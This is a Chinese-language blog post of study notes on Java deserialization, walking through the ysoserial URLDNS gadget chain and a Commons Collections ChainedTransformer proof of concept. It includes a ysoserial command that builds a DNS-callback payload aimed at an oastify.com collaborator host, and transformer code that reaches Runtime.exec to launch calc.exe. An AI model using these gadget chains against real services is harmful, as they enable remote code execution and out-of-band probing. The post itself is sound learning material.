# Ysoserial_URLDNS


&lt;!--more--&gt;

# Ysoserial---URLDNS


&gt;Java在序列化时一个对象，将会调用这个对象中的 `writeObject` 方法，参数类型是 ObjectOutputStream ，开发者可以将任何内容写入这个stream中；
&gt;
&gt;反序列化时，会调用 `readObject` ，开发者也可以从中读取出前面写入的内容，并进行处理。

## 序列化代码示例


一个简单的代码，简单实现了一下`readObject()`方法和`writeObject()`方法

```java
package com.example.ballet.SerializationTest;  
import java.io.*;  
  
  
public class MainTest implements Serializable{  
	//这个是构造函数，不这样写也可以，就是copy的代码里面这样写的就懒得改了
    private int n;  
    public MainTest(int n) {  
        this.n = n;  
    }  
  
    @Override  
    public String toString(){  
        return &#34;deserialize [n=&#34; &#43; n &#43; &#34; , getClass() = &#34; &#43; getClass() &#43; &#34; , hashcode() = &#34; &#43; hashCode() &#43; &#34; , toString() = &#34; &#43; super.toString() &#43; &#34;]&#34;;  
    }  
    
	//自定义readObject方法  
    private void readObject(ObjectInputStream objIn) throws IOException, ClassNotFoundException {  
        objIn.defaultReadObject();  
        //Runtime.getRuntime().exec(&#34;calc&#34;);  
        System.out.println(&#34;TEST&#34;);  
    }  
    
	//操作类，包含序列化和反序列化方法
    class operation1{  
		//序列化
        public static void serialize(Object obj) {  
            try {  
                ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream(&#34;object.bin&#34;));  
                objOut.writeObject(obj);  
                objOut.flush();  
                objOut.close();  
            } catch (FileNotFoundException e) {  
                throw new RuntimeException(e);  
            } catch (IOException e) {  
                throw new RuntimeException(e);  
            }  
        }  
		//反序列化
        public static void deserialize(){  
            try{  
                ObjectInputStream obiIn = new ObjectInputStream(new FileInputStream(&#34;object.bin&#34;));  
                Object x = obiIn.readObject();  
                obiIn.close();  
            } catch (FileNotFoundException e) {  
                throw new RuntimeException(e);  
            } catch (IOException e) {  
                throw new RuntimeException(e);  
            } catch (ClassNotFoundException e) {  
                throw new RuntimeException(e);  
            }  
        }  
    }  
  
    public static void main(String[] args) {  
        MainTest x = new MainTest(5);  
        operation1.serialize(x);  
        operation1.deserialize();  
        System.out.printf(x.toString());  
  
    }  
  
}
```

上述代码只是套皮了一下序列化和反序列化的皮，在改写的readObject中有个`Runtime.exec`，当反序列化执行到`readObject`方法的时候就会执行。

后续进行对ysoserial的测试的时候，将Runtime注释掉
测试只用到`deserialize()`方法

```bash
java -jar ysoserial-all.jar URLDNS http://e7m4ck6e288csewnfwxjwlgbt2ztnlba.oastify.com &gt; poc.bin
```

这条命令会生成一个序列化过的恶意代码，经过反序列化后执行，向指定的URL进行DNS查询
我用的是burpsuite的，所以可以看到如下的结果

![[YT$}W]7XN3~L3I22KGVAEVQ.png]]
后面的基本也就是这个usage。
浏览器里面基本都在关注调用链，只有我在疑惑这个要怎么用。心寒。

不过遇到一个问题
===invalid stream header: FFFE08E1===
使用powershell生成的时候，前面几次开头都是Java的AECD，后面几次就变成了错误的开头。

好了现在说调用链，很值得研究的东西一个


&lt;hr&gt;


## 调用链

起作用的是最终反序列化且输出结果的方法
在URLDNS源代码中
这个方法起到了作用：

### getObject


```java
public Object getObject(String url) throws Exception {  
    URLStreamHandler handler = new SilentURLStreamHandler();  
    HashMap ht = new HashMap();  
    URL u = new URL((URL)null, url, handler);  
    ht.put(u, url);  
    Reflections.setFieldValue(u, &#34;hashCode&#34;, -1);  
    return ht;  
}
```
返回的内容是一个HashMap
根据上面的话，HashMap ht这个对象是序列化和反序列化的关键。


### readObject


其中HashMap类中有`readObject`这个方法

```java
@java.io.Serial  
private void readObject(ObjectInputStream s)  
    throws IOException, ClassNotFoundException {  
  
    ObjectInputStream.GetField fields = s.readFields();  
  
    // Read loadFactor (ignore threshold)  
    float lf = fields.get(&#34;loadFactor&#34;, 0.75f);  
    if (lf &lt;= 0 || Float.isNaN(lf))  
        throw new InvalidObjectException(&#34;Illegal load factor: &#34; &#43; lf);  
  
    lf = Math.min(Math.max(0.25f, lf), 4.0f);  
    HashMap.UnsafeHolder.putLoadFactor(this, lf);  
  
    reinitialize();  
  
    s.readInt();                // Read and ignore number of buckets  
    int mappings = s.readInt(); // Read number of mappings (size)  
    if (mappings &lt; 0) {  
        throw new InvalidObjectException(&#34;Illegal mappings count: &#34; &#43; mappings);  
    } else if (mappings == 0) {  
        // use defaults  
    } else if (mappings &gt; 0) {  
        float fc = (float)mappings / lf &#43; 1.0f;  
        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?  
                   DEFAULT_INITIAL_CAPACITY :  
                   (fc &gt;= MAXIMUM_CAPACITY) ?  
                   MAXIMUM_CAPACITY :  
                   tableSizeFor((int)fc));  
        float ft = (float)cap * lf;  
        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?  
                     (int)ft : Integer.MAX_VALUE);  
  
        // Check Map.Entry[].class since it&#39;s the nearest public type to  
        // what we&#39;re actually creating.        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);  
        @SuppressWarnings({&#34;rawtypes&#34;,&#34;unchecked&#34;})  
        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];  
        table = tab;  
  
        // Read the keys and values, and put the mappings in the HashMap  
        for (int i = 0; i &lt; mappings; i&#43;&#43;) {  
            @SuppressWarnings(&#34;unchecked&#34;)  
                K key = (K) s.readObject();  
            @SuppressWarnings(&#34;unchecked&#34;)  
                V value = (V) s.readObject();  
            putVal(hash(key), key, value, false, false);  
        }  
    }  
}
```


代码的最后几行，作为`ObjectInputStream s`也调用了readObject()方法，但这不是HashMap的，是ObjectInputStream的

主要作用：Internal method to &lt;u&gt;read an object from the ObjectInputStream of the expected type&lt;/u&gt;. Called only from readObject() and readString(). Only Object.class and String.class are supported.

### putVal() &amp; hash()

其实查看源代码`ht.put(u, url); `这里就会自然而然来到这一步。（在调试过程中readObject确实step into。。。调试有些小问题待解决。。）

put()方法是对于键值对的值的操作
```java
public V put(K key, V value) {  
    return putVal(hash(key), key, value, false, true);  
}
```

可以看到也是putVal和hash方法结合，不过在putVal的参数上有区别。




顺着下去：

1. `putVal`是往HashMap中放入键值对的方法
2. `hash()`对key进行处理：
```java
static final int hash(Object key) {  
    int h;  
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);  
}
```
这里可以看到key调用了hashCode()方法，
对这个key的理解需要结合实际：

`ht.put(u, url); `

key是URL实例u，value是String实例url

所以寻找URL类的hashCode方法

```java
public synchronized int hashCode() {  
    if (hashCode != -1)  
        return hashCode;  
  
    hashCode = handler.hashCode(this);  
    return hashCode;  
}
```

handler.hashCode()方法就是进行hash计算。

里面Generate the host part部分通过`InetAddress addr = getHostAddress(u); `调用getHostAddress()方法，根据主机名查找IP——DNS查询

```java
protected synchronized InetAddress getHostAddress(URL u) {  
    if (u.hostAddress != null)  
        return u.hostAddress;  
  
    String host = u.getHost();  
    if (host == null || host.isEmpty()) {  
        return null;  
    } else {  
        try {  
            u.hostAddress = InetAddress.getByName(host);  
        } catch (UnknownHostException ex) {  
            return null;  
        } catch (SecurityException se) {  
            return null;  
        }  
    }  
    return u.hostAddress;  
}
```

到这里也就实现了`URLDNS`。

### 总结一下

===URLDNS通过getObject方法进行操作===
1. readObject对序列化内容进行读取
2. put方法调用putVal和hashCode
	1. putVal将readObject读取的内容写入ht
	2. hashCode进行hash计算的同时进行了DNS请求


```txt
HashMap-&gt;readObject() 
HashMap-&gt;hash() 
URL-&gt;hashCode() 
URLStreamHandler-&gt;hashCode() 
URLStreamHandler-&gt;getHostAddress() 
InetAddress-&gt;getByName(
```


[Java反序列化 — URLDNS利用链分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9417?time__1311=n4%2BxnD0Du0eCqAKG%3DD%2Fin5iKeY5Dt3iCbztC74D)
这个比较详细完整，值得看了研究一下。


&lt;hr&gt;

# “链式反应”


```java
public static void main(String[] args) throws Exception {  
    Transformer[] transformers = new Transformer[] {  
            new ConstantTransformer(Runtime.class),  
            new InvokerTransformer(&#34;getMethod&#34;, new Class[] {  
                    String.class, Class[].class }, new Object[] {  
                    &#34;getRuntime&#34;, new Class[0] }),  
            new InvokerTransformer(&#34;invoke&#34;, new Class[] {  
                    Object.class, Object[].class }, new Object[] {  
                    null, new Object[0] }),  
            new InvokerTransformer(&#34;exec&#34;, new Class[] {  
                    String.class }, new Object[] {&#34;calc.exe&#34;})};  
  
    Transformer transformedChain = new ChainedTransformer(transformers);  
  
    Map innerMap = new hashMap();  
    innerMap.put(&#34;value&#34;, &#34;value&#34;);  
    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);  
  
    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();  
    onlyElement.setValue(&#34;foobar&#34;);  
  
}
```

==**onlyElement对象的包装过程：**==
```mermaid
graph LR
    A[TransformedMap] -- innerMap &#43; transformedChain --&gt; B[outerMap]
    B --&gt; D{onlyElement}
    C[transformers] -- ChainedTransformer --&gt; E[transformedChain]
    
```

==**触发**==

当上面的代码运行到`setValue()`时，就会触发`ChainedTransformer`中的一系列变换函数：
- 首先通过`ConstantTransformer`获得`Runtime`类
- 进一步通过反射调用`getMethod`找到`invoke`函数
- 最后再运行命令`calc.exe`。


&lt;hr&gt;

而后面level up的POC使用`AnnotationInvocationHandler`是因为该类的`readObject`方法中增加了关于触发条件`setValue`的调用。
也就是说，之前需要通过调用Map对象的setValue方法，现在在readObject方法中就有该方法，在进行序列化时，就会触发setValue方法，进而触发transform变换。







---

> Author:   
> URL: https://66lueflam144.github.io/posts/184ceac/  

